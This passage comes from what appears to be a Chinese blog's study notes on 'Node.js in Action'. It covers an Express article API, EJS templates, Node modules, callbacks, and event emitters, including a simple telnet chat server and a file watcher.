require('body-parser');// 加载数据库模块 Article 类const Article = require('./db').Article;app.use(bodyParser);// 支持编码为 JSON 的消息请求体app.use(bodyParser.json());// 支持编码为表单的请求消息体app.use(bodyParser.urlencoded(&#123; extended: true &#125;));// 数组定义 文章articlesconst articles = [&#123; title: 'Example' &#125;];const port = process.env.PORT || 3000;// 添加路由处理器app.get('/', (req, res) =&gt; &#123; res.send('Hello World');&#125;);// 获取所有文章app.get('/articles', (req, res, next) =&gt; &#123; Article.all((err, articles) =&gt; &#123; if (err) return err; res.send(articles); &#125;);&#125;);// 获取指定文章app.get('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; Article.find(id, (err, article) =&gt; &#123; if (err) return next(err); res.send(article); &#125;);&#125;);// 删除指定文章app.delete('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; Article.delete(id, (err) =&gt; &#123; if (err) return next(err); res.send(&#123; message: 'Deleted' &#125;); &#125;);&#125;);// 程序实例绑定到一个 TCP端口app.listen(port, () =&gt; &#123; console.log(`Express web app available at localhost: $&#123;port&#125;`);&#125;);module.exports = app; db.js 文件放在同个目录，Node 会加载那个模块，然后用它获取所有文章，查找特定文章和删除一篇文章。 最后一件事情是实现创建文章的功能。还要用 readability 算法处理它们。 让文章可读并存起来RSETful API 已经搭建好了，数据也可以持续化到数据库中，接下来该写代码把网页转换成简化版的 “阅读视图”。不过我们不用自己实现， npm 中有这样的模块。 在 npm上搜索 readability 会找到很多模块。我们试一下 node-readability: 1npm i node-readability -S 这个模块提供了一个异步函数，可以下载指定 URL 页面并将 HTML 转换成简版。 12345const read = require('node-readability');const url = 'http://www.manning.com/cantelon2/';read(url,(err,result)=&gt;&#123; // 结果有.title 和 content&#125;) 还可以和数据库类结合起来，用 Article.create 方法保存文章： 12345read(url,(err,result)=&gt;&#123; Article.create(&#123;title:result:title,content: result.content&#125;,(err,article) =&gt;&#123; // 将文章保存到数据中 &#125;);&#125;); 打开 index.js 添加新的 app.post 路由处理器，用上面的方法方法实现下载和保存文章的功能。 123456789101112131415const read = require('node-readability');// 创建一篇文章app.post('/articles', (req, res, next) =&gt; &#123; // 从 POST 消息体重得到 URL const url = req.body.url; read(url, (err, result) =&gt; &#123; // 用 readabiliry 模块获取这个 URL 指向的页面 if (err || !result) res.status(500).send('Error downloading article'); Article.create(&#123; title: result.title, content: result.content &#125;, (err, article) =&gt; &#123; if (err) return err; // 文章保存成功后发送提示 res.send('OK'); &#125;); &#125;);&#125;); 上面代码中，先从 POST 消息体中得到 URL ，然后用 node-readability 模块获取这个URL 指向的页面，用模型类 Article 保存文章，如果有错误，将处理权交给 express 的中间件栈；否则，将 JSON 格式的文章发送给客户端。 添加用户界面给 Express 项目添加界面需要做的几件事情，首先是使用模块引擎。 支持多种格式基本做法是用 Express 的 res.format 方法，它可以根据请求发送响应格式的响应。它的用法如下，提供一个包含格式已经对应的响应函数的列表： 12345678res.format(&#123; html:()=&gt;&#123; res.render('articles.ejs',&#123; articles: articles&#125;); &#125;, json:()=&gt;&#123; res.send(articles); &#125;&#125;); 这段代码中， res.render 会渲染 view 文件夹下的 articles.ejs。但这需要安装模板引擎并创建相应的模板。 渲染引擎模板引擎有很多，EJS属于简单易学的那种。安装： 1npm i ejs -S res.render 可以渲染 EJS 格式 的 HTML 文件。在 view 文件夹中创建 articles.ejs 1234567891011&lt;% include head %&gt;&lt;ul&gt; &lt;% articles.forEach(article =&gt;&#123; %&gt; &lt;li&gt; &lt;a href=&quot;/articles/&lt;%= article.id %&gt;&quot;&gt; &lt;%= article.title %&gt; &lt;/a&gt; &lt;/li&gt; &lt;% &#125;) %&gt;&lt;/ul&gt;&lt;% include foot%&gt; 页眉和页脚模块 1234567891011 &lt;!-- 页眉 --&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;!-- 页脚 --&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 用npm管理客户端依赖项模块搞定之后，就是样式了。安装 bootstrap 1npm install bootstrap --save 然后在 node_modules/boostrap 里面会看到源码，在 dist/css 里面有css文件，要让服务器响应静态文件请求才可以使用这些文件。 Express 自带了 一个名为 express.static 中间件，可以给浏览器发送客户端 JavaScript、图片和CSS 文件。只要将它指向包含这些文件的目录，浏览器就可以访问到这些文件了。 12// 加载 css文件app.use('/css/bootstrap.css',express.static('node_modules/bootstrap/dist/css/bootstrap.css')); 接着在头模块中引入 1&lt;link rel="stylesheet" href="/css/bootstrap.css"&gt; 这只是 Bootstrap的 CSS。它还有很多文件，包括图标、字体以及 jQuery插件。你可以往项目里添加更多文件，或者用工具把它们打包成一个文件，让浏览器更容易加载。 总结 用 npm init 和 Express 可以快速搭建出一个 Node Web 应用程序 npm install 是安装依赖项的命令 可以用 Express 制作带有 RESTful API 的 Web 程序 选择适合的数据库系统和数据库模板根据个人需求 对于小项目来说，SQLite 很好用 在 Express 中用EJS渲染模板很容易 Express 支持很多模块引擎，包括Pug和Mustache]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— Node编程基础]]></title>
    <url>%2F2018-12-01-NodeJs2-Part2.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 Node编程基础本章内容： 用模块组织代码 用回调处理一次性时间 用事件发射器处理重复性事件 实现串行和并行的流程控制 使用流程控制工具 本章要解决摆在Node 新手开发面前的两个难题: 如何组织代码 如何实现异步编程 如何响应一次性事件 如何处理重复性事件 如何让异步逻辑顺序执行 Node 功能的组织及重用传统的方式是按逻辑相关性对代码分组，将包含大量代码的单个文件分解成多个文件。 对于整合一个文件（’included’文件）中的逻辑，后面引入这个文件里面的任何变量或者是函数可能会覆盖应用程序原来的相同的变量或者是函数。 在PHP中可以使用 命名空间 解决这个问题， Ruby 通过模块也提供了类似的功能。但 Node 的做法是不给你有污染命名空间的机会。 Node 模块打包代码是为了重用，但是不会改变全局作用域。Node 模块允许从被引入文件中选择要暴露给程序的函数和变量，如果模块返回的函数或者变量不止一个，那么它可以通过设定 exports 对象的属性来指明它们。如果这个模块只返回一个函数或者变量，则可以设定 module 属性。 Node 模块系统避免了对全局作用域的污染，从而也就避免了命名冲突，并简化了代码的重用。模块还可以发布到 npm 存储库中。使用线上这些模块没有必要担心会覆盖其他模块的变量和函数。 下面将会通过一个实例来说明把逻辑组织到模块中，需要注意的几个问题： 如何创建模块 模块放在文件系统中的什么地方 在创建和使用模块时要注意的东西 开始一个新的 Node 项目创建一个文件，在该目录下输入 1npm init -y -y 代表 yes，这样 npm 就会创建一个全部使用默认值的 package.json 文件。如果想要更多的控制权，则去掉 -y，就可以自定义 授权许可、作者名字等等…不过这些都没有什么必要吧，因为你也可以手动再去修改初始化的 package.json 文件。 创建模块模块既可以是一个文件，也可以是包含一个或者多个文件的目录。如果模块是一个目录，Node通常会在这个目录下找一个叫 index.js的文件作为模块的入口。典型的模块是一个包含 exports 对象属性定义的文件，这些属性可以是任意类型的数据，比如字符串、对象和函数。 创建一个模块，来进行货币转换。 12345678const canadianDollar = 0.91;function roundTwo(amount)&#123; return Math.round(amount * 100) / 100;&#125;// canadianToUS 与 USToCanadian函数设定在 exports 模块中，所以引入这个模块的代码可以使用它们exports.canadianToUS = canadian =&gt; roundTwo(canadian * canadianDollar);exports.USToCanadian = us =&gt; roundTwo(us / canadianDollar); exports 对象上只设定了两个属性。也就是说引入这个模块的代码只能访问到 canadianToUS 与 USToCanadian两个函数。而变量 canadianDollar 作为私有变量仅作用在 这两个函数的逻辑内部，程序并不能直接访问它。 使用这个模块要用到 Node 的 require 函数，该函数以所用模块的路径为参数。Node 以同步的方式寻找模块，定义到这个模块并加载文件中的内容。Node 查找文件的 顺序是先找到核心模块，然后是当前目录，最后是 node_modules 关于 require 和 同步I/O require 是 Node 中少数几个同步 I/O操作之一。因为经常用到模块，并且一般都是在文件顶端引入，所以把 require 做成同步的有助于代码的整洁、有序。 但在I/O密集的地方尽量不要用 require。所有同步调用都会阻塞 Node,知道调用完成才能做其他事情。比如你正在运行一个 HTTP 服务器，如果在每个进入的请求上都用了 require，就会遇到性能问题。所以 require 和其他同步操作通常放在最初加载的地方。 下面这个是 test-currency.js 中的代码，它 require 了 currency.js 模块 123456// 路径 ./ 代表模块跟程序脚本放在同一个目录下const currency = require('./currency');console.log('50 Canadian dollars equals this amount of US dollars:');console.log(currency.canadianToUS(50));console.log('30 US dollars equals this amount of Canadian dollars:');console.log(currency.USToCanadian(30)); 引入时，.js 扩展名可以忽略。如果没有指明是 js文件，Node也会检查 json 文件，json 文件就是作为 JavaScript 对象加载的。 在 Node 定位到并计算好你的模块之后， require 函数会返回这个模块中定义的 exports 对象中的内容，然后你就可以用这个模块中的两个函数做货币转换了。 如果想把这个模块放在子目录，比如 ’/lib‘，只要把 require 语句改成下面的就可以了 1const currency = require('./lib/currency'); 组装模块中的 exports 对象是在单独的文件中组织可重用代码的一种简便方法。 用 module.exports 微调模块的创建尽管用函数和变量组装 exports 对象能满足大多数的模块的需要，但有时你可能需要调用不同的模型来创建该模块。 比如说，前面创建的那个货币转换器模块可以改成只返回一个 Currency 构造函数，而不是一个包含两个函数的对象。一个面向对象的实现看起来可能想下面这样： 1234const Currency = require('./currency');const canadianDollar = 0.91;const currency = new Currency(canadianDollar);console.log(currency.canadianToUS); 如果只需要从模块中得到一个函数，那从 require 中返回一个函数的代码要比返回一个对象的代码更加优雅。 要创建一个变量或者函数的模块，你可能会以为只要把 exports 设定你想返回的东西就行。但是这样是不行的，因为 Node 觉得不用任何其他对象、函数或者变量给 exports 赋值。下面代码清单中的模块代码视图将一个函数赋值给 exports 12345678910111213141516// 这个模块不能用class Currency&#123; constructor(canadianDollar)&#123; this.canadianDollar = canadianDollar; &#125; roundTwoDecimals(amount)&#123; return Math.round(amount * 100) / 100; &#125; canadianToUS(canadian)&#123; return this.roundTwoDecimals(canadian * this.canadianDollar); &#125; USToCanadian(us)&#123; return this.roundTwoDecimals(us / this.canadianDollar); &#125;&#125;exports = Currency; // 错误，Node 不允许重写 exports 为了让前面那个模块可用，需要把 exports 换成 module.exports 。用 module.exports 可以对外提供单个变量、函数或者对象。如果你创建了一个既有 exports 又有 module.exports 的模块。那么它会返回 module.exports ，而 exports 会被忽略。 导出的究竟是什么 最终在程序里导出的是 module.exports。 exports 只是对 module.exports 的全局引用，最初被定义为一个可以添加属性的空对象。 exports.myFunc 只是 module.exports.myFunc 的简写。 所以，如果把 exports 设定为别的，就打破了 module.exports 之间的引用关系。可是因为真正导出的是 module.exports，那样 exports 就不能用了，因为它不再指向 module.exports 了。如果你想保留那个链接，可以像下面这样让 module.exports 再次引用 exports: 1module.exports = exports = Currency; 根据需要使用 exports 或 module.exports 可以将功能组织成模块，规避将程序脚本一直增长所产生的弊端。 用 node_module 重用模块要求模块在文件系统中使用相对路径存放，对于组织程序特定的代码很有帮助，但对于想要在程序房间共享或跟其他人共享代码却用处不大。Node 中有一个独特的引用机制，可以不必知道模块在文件系统中的具体位置。这个机制就是使用 node_modules 目录。 如果引入的时候省略掉路径，直接写文件名，Node 会遵照几个柜子搜寻这个模块 用环境变量 NODE_PATH 可以改变 Node 模块的默认路径。如果用了它，在 Window 中 NODE_PATH 应该设置为用分号分隔的目录列表，在其他操作系统中则用冒号分隔。 注意事项尽管Node模块系统的本质简单直接，但是有两点需要注意一下。 第一，如果模块是目录，在模块目录中定义模块的文件必须被命名为 index.js ，除非你在这个目录下一个叫 package.json 的文件里特别指明。要指定一个取代 index.js 的文件，package.json 文件里必须有一个用 JavaScript 对象表示法 （JSON）数据定义的对象，其中有一个名为 main 的键，指明模块目录内文件的路径。下面的流程图对这些规则做了汇总。 下面是一个 package.json 文件的例子，它指定 currency.js 为主文件 123&#123; "main":"currency.js"&#125; 第二，Node 能把模块作为对象缓存起来，如果程序中的两个文件引入了相同的模块，第一个 require 会把模块返回的数据存到内容中，这样第二个 require 加不用再去访问和计算模块的源文件了。也就是说，同个进程中使用 require 加载一个模块得到的是相同的对象。假设你搭建了一个 MVC Web 程序，它有一个主对象 app。你可以设置好那个 app 对象，导出它，然后在项目中的任何地方 require 它。如果你在这个 app 对象中放了一些配置信息，那你就可以在其他文件访问这些配置信息的值，假设目录接口如下： 1234project --app.js --models --post.js 下面展示它的工作原理 使用异步编程技术服务端异步编程：事件也会触发响应逻辑，在Node 的世界流行两种响应逻辑管理方式，回调和事件监听。 回调通常用来定义一次性响应的逻辑，比如对于数据库查询，可以指定一个回调函数来确定如何处理查询结果。这个回调函数可能会显示数据库查询结果，根据这些结果来做些计算，或者以查询结果为参数执行另一个回调函数。 事件监听器本质上也是一个回调，不同的是，它是一个概念实体（事件）相关联。例如，当有人在浏览器点击鼠标时，鼠标点击就是一个需要处理的事件。在node 中，当有 HTTP 请求过来时候，HTTP服务器会发出一个 request 事件。你可以监听那个 request 事件，并添加一些响应逻辑。在下面的例子中，用 EventEmitter.prototype.on 方法在服务器上绑定了一个监听器，所以每当有 request 事件发出时，服务器就会调用 hanldeRequest 函数： 1server.on('request',handleRequest); 一个 Node HTTP 服务器实例就是一个事件发射器，一个可以继承、能够添加事件发射及处理能力的类（EventEmitter）。Node 的许多核心功能都继承自 EventEmitter ，你也能创建自己的事件发射器。 Node 有两种常用的响应逻辑组织方式，我们刚才用了一种，接下来要了解它的工作机制： 如何用回调处理一次性事件 如何用事件监听器响应重复性事件 异步编程的几个难点 用回调处理一次性事件回调是一个函数，它被当做参数传给异步函数，用来描述异步操作完成之后要做什么。回调函数 在 Node 开发使用得很频繁，比事件发射器用得多，并且用起来也很简单。 为了演示回调的用法，我们来做一个简单的 HTTP 服务器，让它实现以下的功能 异步获取存在 JSON 文件中的文章的标题 异步获取简单的HTML 模块 把那些标题组装到 HTML 页面中 把 HTML 页面发送给用户 JSON 文件（title.json）会被格式化陈给一个包含文章标题的字符串数组，内容如下： 12345[ "Kazakhstan is a huge country... what goes on there?", "This weather is making me craaazy", "My neighbor sort of howls at night"] HTML 文件 template.html 如下结构，可以插入博客文章的标题 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;回调的用法&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Lates Posts&lt;/h1&gt; &lt;!-- %会被替换 --&gt; &lt;ul&gt; &lt;li&gt;%&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 获取 JSON 文件中的标题并渲染 Web 页面的代码如下： 12345678910111213141516171819202122232425262728293031// blog_recent.jsconst http = require('http');const fs = require('fs');// 创建 HTTP 服务器并调用回调定义响应逻辑http.createServer((req,res) =&gt;&#123; if(req.url == '/')&#123; // 读取 JSON 文件并调定义如何处理其中的内容 fs.readFile('./title.json',(err,data) =&gt;&#123; if(err)&#123; console.log(err); res.end('Server Error'); &#125;else&#123; const titles = JSON.parse(data.toString()); // 读取 HTML 模块，并在加载完成后使用回调 fs.readFile('./template.html',(err,data) =&gt;&#123; if(err)&#123; console.log(err); res.end('Server Error'); &#125;else&#123; // 组装 HTML 页面以显示博客标题 const tmpl = data.toString(); const html = tmpl.replace('%',titles.join('&lt;li&gt;&lt;/li&gt;')); res.writeHead(200,&#123; 'Content-Type':'text/html' &#125;); // 将 HTML 页面发送给用户 res.end(html); &#125; &#125;); &#125; &#125;); &#125;&#125;); 这这个例子中，嵌套了三层 123http.createServer((req, res) =&gt; &#123; ... fs.readFile('./titles.json', (err, data) =&gt; &#123; ... fs.readFile('./template.html', (err, data) =&gt; &#123; ... 三层还可以，但是调用层数越多，代码看起来越乱，重构和测试起来也很困难，所以最好限制一下回调的嵌套层级。如果把每一层回调嵌套的处理做成命名函数，虽然表示相同逻辑所用的代码变多了，但维护、测试和重构起来会跟更容易。下面代码创建了中间函数来减少嵌套 123456789101112131415161718192021222324252627282930313233343536373839404142const http = require('http');const fs = require('fs');// 客户端请求一开始会进入到这里http.createServer((req, res) =&gt; &#123; // 控制权交给了 getTitles getTitles(res);&#125;).listen(8000, '128.0.0.1');// 获取标题，并将控制权转交给 getTemplatefunction getTitles(res) &#123; fs.readFile('./title.json', (err, data) =&gt; &#123; if (err) &#123; hadError(err, res); &#125; else &#123; getTemplate(JSON.parse(data.toString()), res); &#125; &#125;);&#125;// getTemplate读取模块文件，并将控制权转交给 formatHtmlfunction getTemplate(titles, res) &#123; fs.readFile('./template.html', (err, data) =&gt; &#123; if (err) &#123; hadError(err, res); &#125; else &#123; formatHtml(titles, data.toString(), res); &#125; &#125;);&#125;// formatHtml 得到标题和模板，渲染一个响应给客户端function formatHtml(titles, tmpl, res) &#123; const html = tmpl.replace('%', titles.join('&lt;li&gt;&lt;/li&gt;')); res.writeHead('Content-Type', 'text/html'); res.end(html);&#125;// 错误处理，如果过程中出错，控制台会输出错误，并想客户端返回 Server Errorfunction hadError(err, res) &#123; console.log(err); res.end('Server Error');&#125; 还可以用 Node 开发中的另一种惯用法来减少由 if/else 引起的嵌套，尽早从函数中返回。 通过尽快返回减少嵌套的例子： 12345678910111213141516171819202122232425262728293031const http = require('http');const fs = require('fs');http.createServer((req, res) =&gt; &#123; getTitles(res);&#125;).listen(8000, '128.0.0.1');function getTitles(res) &#123; fs.readFile('./titles.json', (err, data) =&gt; &#123; if (err) return hadError(err, res); getTemplate(JSON.parse(data.toString()), res); &#125;);&#125;function getTemplate(titles, res) &#123; fs.readFile('./template.html', (err, data) =&gt; &#123; if (err) return hadError(err, res) formatHtml(titles, data.toString(), res); &#125;);&#125;function formatHtml(titles, tmpl, res) &#123; const html = tmpl.replace('%', titles.join('&lt;li&gt;&lt;/li&gt;')); res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end(html);&#125;function hadError(err, res) &#123; console.log(err); res.end('Server Error');&#125; 我们已经知道如何使用一次性任务定义响应了。上面的读取文件和响应 Web 服务器请求。 Node 的异步回调惯例 Node 中的大多数内置模块在使用回调时都会带两个参数，第一个用来放可能会发生的错误，第二个用来放结果。错误参数经常缩写为 err。 用事件发射器处理重复性事件事件处理器会触发事件，并且在那些事件被触发时能处理它们，一些重要的Node Api 组件，比如 HTTP 服务器、TCP 服务器和流，都被做成了事件发射器。我们也可以创建自己的事件发射器。 事件是通过监听器进行处理的。监听器是跟事件相关联的、当有事件出现时就会触发的回调函数。比如 Node 中的 TCP socket ，它有一个 data 事件，每当 socket 中有新数据时就会触发： 1socket.on('data', handleData); 事件发射器示例echo 服务器就是一个处理重复性事件的简单例子，当你给它发送数据时，它会把数据发回来。 实现一个 echo 服务器，当有客户端连接上来时，它就会创建一个 socket 。socket 是一个事件发射器，可以用 on 方法添加监听器响应 data 事件。只要 socket 上有新数据过来，就会发这些 data 事件。 123456789const net = require('net');const server = net.createServer(socket =&gt; &#123; // 当读取到新数据时处理的 data 事件 socket.on('data', data =&gt; &#123; // 数据被写回到客户端 socket.write(data); &#125;);&#125;);server.listen(8888); 用下面的命令运行 echo 服务器： 1node echo_server.js echo 服务器运行起来之后，就可以用下面的命令连上去(可以另开一个终端)： 1telnet 127.0.0.1 8888 每次通过 telnet 会话把数据发送给服务器，数据都会回传到 telnet会话中，意味着你每打一个字母，它也会返回对应的字母。 window 的 telnet 是默认不开启的。具体怎么开启可以看这里。 响应只应该发生一次的事件监听器可以被定义成持续不断被地响应事件，如前面的例子，也能被定义成只响应一次，下面的代码用了 once 方法，对前面的那个 echo 服务器做了修改，让它只回应第一次发送过来的数据。 1234567const net = require('net');const server = net.createServer(socket =&gt; &#123; socket.once('data', data =&gt; &#123; socket.write(data); &#125;);&#125;);server.listen(8888); 创建事件发射器：一个 PUB/SUB 的例子前面的例子用了一个带事件发射器的 Node 内置 API。然后我们可以用 Node 内置的事件模块创建自己的事件发射器。 下面代码定义了一个 channel 事件发射器，带有一个监听器，可以向加入频道的人做出相应。注意这里用 on (或者用较长的 addListener)方法给事件发射器添加了监听器： 1234567const EventEmitter = require('events').EventEmitter;const channel = new EventEmitter();channel.on('join',() =&gt;&#123; console.log('Welcome');&#125;);// 用 emit 函数发射这个事件，否则永远不会回调channel.emit('join'); 事件名称：事件是可以具有任意字符串值的键：data、join或某些长的让人发疯的事件名都行。只有一个事件是特殊的，那就是 error 。 接着用 EventEmitter 实现自己的发布/预定逻辑，做一个通信通道。如果运行了下面的代码，就会得到一个简单的聊天服务器。聊天服务器的频道被做成了事件发射器，能对客户端发出的 join 事件做成响应。当有客户端加入聊天频道时，join 监听器逻辑会将一个针对该客户端的监听器附加到频道上，用来处理会将所有广播消息写入改客户端 socket 的 broadcast 事件。事件类型的名称,比如 join 和 broadcast ，完全是随意取的。你可以按自己的喜好给它们换个名字。 用事件发射器实现简单的发布/预定系统 12345678910111213141516171819202122232425262728const events = require('events');const net = require('net');const channel = new events.EventEmitter();channel.clients = &#123;&#125;;channel.subscriptions = &#123;&#125;;channel.on('join',function(id,client)&#123; // 添加 join 事件的监听器，保存用户的 client 对象，以便程序可以将数据发送给用户 this.clients[id] = client; this.subscriptions[id] = (senderId,message) =&gt;&#123; if(id != senderId)&#123; this.clients[id].write(message); &#125; &#125; // 添加一个专门针对当前用户的 broadcast 事件监听器 this.on('broadcast',this.subscriptions[id]);&#125;);const server = net.createServer(client =&gt;&#123; const id = `$&#123;client.remoteAddress&#125;:$&#123;client.remotePort&#125;`; // 当有用户连接到服务器上时发出一个 jion 事件，指明用户 ID 和 client 对象 channel.emit('join',id,client); client.on('data',data =&gt;&#123; data = data.toString(); // 当有用户发送数据时，发出一个频道 broadcast 事件，指明用户 ID 和 消息 channel.emit('broadcast',id,data); &#125;);&#125;);server.listen(8888); 把聊天服务器跑起来后，打开两个新的命令行窗口，并在两个都输入下面的命令进入聊天程序： 1telnet 127.0.0.1 8888 在其中任何一个窗口输入的内容都会被发送到其他所有窗口中。 这个聊天服务器还有一个问题，在用户关闭连接离开聊天室后，原来的那个监听器还在，仍会尝试向已经断开连接写数据。这样自然就会出错。为了解决这样的问题，还要按照下面的代码清单把监听器加到频道事件发射器上，并且向服务器的 close 事件监听器中添加发射频道的 leave 事件的处理逻辑。leave 事件本质上就是要移除原来给客户端添加的 broadcast 监听器。 创建一个在用户断开连接时能 “打扫战场”的监听器 123456789101112131415161718192021222324252627282930313233343536373839const events = require('events');const net = require('net');const channel = new events.EventEmitter();channel.clients = &#123;&#125;;channel.subscriptions = &#123;&#125;;channel.on('join',function(id,client)&#123; // 添加 join 事件的监听器，保存用户的 client 对象，以便程序可以将数据发送给用户 this.clients[id] = client; this.subscriptions[id] = (senderId,message) =&gt;&#123; if(id != senderId)&#123; this.clients[id].write(message); &#125; &#125; // 添加一个专门针对当前用户的 broadcast 事件监听器 this.on('broadcast',this.subscriptions[id]);&#125;);// 创建leave 事件的监听器channel.on('leave',function(id)&#123; channel.removeListener('broadcast',this.subscriptions[id]); // 移除指定客户端的broadcast 监听器 channel.emit('broadcast',id,`$&#123;id&#125; has left the chatroom. \n`);&#125;);const server = net.createServer(client =&gt;&#123; const id = `$&#123;client.remoteAddress&#125;:$&#123;client.remotePort&#125;`; // 当有用户连接到服务器上时发出一个 jion 事件，指明用户 ID 和 client 对象 channel.emit('join',id,client); client.on('data',data =&gt;&#123; data = data.toString(); // 当有用户发送数据时，发出一个频道 broadcast 事件，指明用户 ID 和 消息 channel.emit('broadcast',id,data); &#125;); // 在用户断开连接是发出 leave 事件 client.on('close',() =&gt;&#123; channel.emit('leave',id); &#125;);&#125;);server.listen(8888); 如果你想停止提供聊天服务，但是又不想关掉服务器的，可以用 removeAll-Listeners 事件发射器方法去掉给定类型的全部监听器。 1234channel.on('shutdown',() =&gt;&#123; channel.emit('broadcast','','The Server has shut down.\n'); channel.removeAllListeners('broadcast');&#125;); 然后你可以添加一个停止服务的聊天命令。为此需要将 data 事件的监听器改成下面这样： 12345678client.on('data',data =&gt;&#123; data = data.toString(); if(data === 'shutdown\r\n')&#123; channel.emit('shutdown'); &#125; // 当有用户发送数据时，发出一个频道 broadcast 事件，指明用户 ID 和 消息 channel.emit('broadcast',id,data);&#125;); 现在只要有人输入 shutdown 命令，所有参与聊天的人都会被踢出去。 错误处理 在错误处理上有一个常规做法，你可以创建发出 error 类型事件的事件发射器，而不是直接抛出错误，这样就可以为这事件类型设置一个或者多个监听器，从而定制的事件响应逻辑。 下面的代码显示的是一个错误监听器如何将发出的错误输出到控制台中： 123456const events = require('events');events.myEmitter = new events.EventEmitter();myEmitter.on('error',err =&gt;&#123; console.log(`ERROR: $&#123;err.message&#125;`); &#125;);myEmitter.emit('error', new Error('something is wrong')); 如果发出这个 error 事件流类型没有该事件类型的监听器，事件监听器会输出一个栈跟踪（到错误发生时所执行的程序指令列表）并停止执行。栈跟踪会用 emit 调用的第二个参数指明错误类型。这是只有错误类型事件才能享受的特殊待遇，在发出没有监听器的其他事件类型时，什么也不会发生。 如果发出的 error 类型事件没有作为第二个参数的 error 对象，栈跟踪会指出一个 ”为捕获、未指明的‘错误’事件“错误，并且程序会停止执行。可以用一个已经废除的方法来处理这个错误，用下面的代码顶一个全局的处理器实现响应逻辑 1234process.on('uncaughtException',err =&gt;&#123; console.log(err.stack); process.exit('1');&#125;); 让连接上面的用户看到当前有几个已链接的聊天对象，可以用下面这个监听器方法，它能根据给定的事件类型返回一个监听器数组： 12345678910111213141516channel.on('join', function (id, client) &#123; //查看加入聊天室的人数 const welcome = ` Welcome! Guset online: $&#123;this.listeners('broadcast').length&#125;`; client.write(`$&#123;welcome&#125;\n`); // 添加 join 事件的监听器，保存用户的 client 对象，以便程序可以将数据发送给用户 this.clients[id] = client; this.subscriptions[id] = (senderId, message) =&gt; &#123; if (id != senderId) &#123; this.clients[id].write(message); &#125; &#125; // 添加一个专门针对当前用户的 broadcast 事件监听器 this.on('broadcast', this.subscriptions[id]);&#125;); 为了增加能够附加到事件发射器上的监听器数量，不让Node 在监听器数量超过 10个时发出警告，可以用 setMaxListeners 方法。以该频道事件发射器为例，可以用下面的代码增加监听器的数量： 1channel.setMaxListeners(50); 扩展事件监听器：文件监听器如果你想在事件发射器的基础上构造程序，可以创建一个新的 javaScript 类继承事件发射器。 比如创建一个 watcher 类来处理放在某个目录下的文件，然后可以用这个类创建一个工具，该工具可以监视目录（将放在里面的文件名都改为小写，并将文件复制到一个单独目录中） 设置好 Watcher 对象后，还需要加两个新方法来扩展继承自 EventEmitter 的方法，代码如下： 123456789101112131415161718192021222324252627const fs = require('fs');const events = require('events');// 扩展 EventEmitter 添加处理文件的方法class Watcher extends events.EventEmitter &#123; constructor(watchDir, processedDir)&#123; super(); this.watchDir = watchDir; this.processedDir = processedDir; &#125; // 处理 watch 目录中的所有文件 watch()&#123; fs.readdir(this.watchDir, (err, files) =&gt;&#123; if(err) throw err; for(var index in files)&#123; this.emit('process',files[index]); &#125; &#125;); &#125; // 添加开始监控的方法 start()&#123; fs.watchFile(this.watchDir, ()=&gt;&#123; this.watch(); &#125;); &#125;&#125;module.exports = Watcher; watch 方法循环目录，处理其中的所有文件。start 方法启动对目录的监控。监控用到了 Node 的 fs.watchFile 函数，所以当被监控的目录中有事情发生的时候，watch方法就会触发，循环遍历整个受监控的目录，可以用一下代码创建一个 Watcher 对象： 1const watcher = new Watcher(watchDir,processedDir); 注意，watchDir为观察的文件名， processedDir为文件进程处理后要放置的文件名 有了新创建的 Watcher 对象，就可以继承自事件发射器类的 on 方法设定每个文件的处理逻辑，如下所示： 12345678910watcher.on('process',(file) =&gt;&#123; // 目标文件路径 const watchFile = `$&#123;watchDir&#125;/$&#123;file&#125;`; // 处理之后文件的小写路径 const processedFile = `$&#123;processedDir&#125;/$&#123;file.toLowerCase()&#125;`; // 重命名文件 fs.rename(watchFile,processedFile,err =&gt;&#123; if(err) throw err; &#125;);&#125;); 接着就可以启动对目录的监控： 1watcher.start(); 新建 watch 和 done 目录，然后输入目标文件名和完成之后的文件名: 12const watchDir = 'watch';const processedDir = 'done'; 运行你所命名的文件名: 1node Extended_Emitter.js 接着把文件丢到 watch 目录中，然后看着文件出现在 done 目录中，文件名被改成小写。这就是用事件发射器创建新类的例子。 学习了使用回调定义一次性异步逻辑，已经如何用事件发射器重复派发异步逻辑。我们可能还想在单个回调或事件发射器的监听器中添加新的异步任务。如果这些任务的执行顺序很重要，就会面对新的难题:如何准确控制一系列异步任务里的每个任务。 异步开发的难题在创建异步程序的时候，必须密切关注程序的执行流程，盯着程序的状态：事件轮询的条件、程序变量，以及其他随着程序逻辑执行而发生变化的资源。 比如说，Node 的事件轮询会跟踪还没有完成的异步逻辑。只要有异步逻辑未完成，Node 进程就不会退出。一个持续运行的 Node 进程对 Web 服务器之类的应用来说很有必要，但对于命令行工具这种经过一段时间后就应该结束的应用却意义不大。事件轮询会跟踪所有数据库连接，直到它们关闭，以防止 Node 退出。 下面是一段可能因为执行顺序而导致混乱的异步代码，如果例子中的代码能够同步执行，那么应该输出的是 ‘The color is blue’，可这个例子是异步的，在 console.log 执行之前的 color 的值还在变化，所以输出的是 ‘The color is green’. 12345678910// 作用域如何到导致 bug 出现的function asyncFunction(callback)&#123; setTimeout(callback,200);&#125;let color = 'blue';asyncFunction(() =&gt;&#123; // 最晚执行，200毫秒后执行 console.log(`The color is $&#123;color&#125;`);&#125;);color = 'green'; 用 JavaScript 闭包可以 ‘冻结’color 里面的值，在下面的代码中，对 asyncFunction 的调用被封装到了一个 以 color 为参数的匿名函数里。这样就可以马上执行这个匿名函数，把当前的 